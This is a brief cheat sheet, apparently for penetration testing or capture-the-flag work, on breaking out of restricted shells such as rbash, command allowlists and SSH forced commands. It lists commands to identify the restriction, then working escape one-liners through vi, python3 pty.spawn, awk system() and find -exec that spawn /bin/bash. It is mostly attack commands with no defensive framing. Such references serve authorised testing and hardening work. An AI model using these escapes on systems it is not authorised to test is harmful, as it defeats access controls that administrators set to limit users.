# Restricted shell checks

## Identify the restriction
rbash, command allowlist, SSH forced command and menu need different escapes.

```bash
printf '%s\n' "$0" "$SHELL" "$PATH"
command -v vi vim python3 awk find
```
- rbash blocks commands containing `/` and assignments to `PATH`/`SHELL`: `/bin/ls` and `export PATH=...` are not escapes.

## Escape via an allowed program
```bash
# vi/vim: then  :shell  or  :!/bin/bash
vi
python3 -c 'import pty;pty.spawn("/bin/bash")'
awk 'BEGIN{system("/bin/bash")}'
find . -maxdepth 0 -exec /bin/bash \;
```
- The outer command and its arguments must be allowed by the wrapper.
- Escaped shell is normally the same user: check with `id`.
- SSH remote commands still go through the login shell / forced command.
